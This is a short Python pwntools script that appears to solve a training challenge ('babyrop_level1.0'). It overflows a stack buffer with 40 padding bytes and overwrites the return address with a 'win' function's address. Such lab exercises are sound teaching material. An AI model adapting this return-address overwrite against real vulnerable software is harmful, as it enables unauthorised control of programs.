from pwn import *


offset = 40
proc = process('/challenge/babyrop_level1.0')
elf = ELF('/challenge/babyrop_level1.0')
win = elf.sym['win']
proc.recv()
payload = b'A' * (offset) + p64(win)
proc.sendline(payload)
print(proc.interactive())
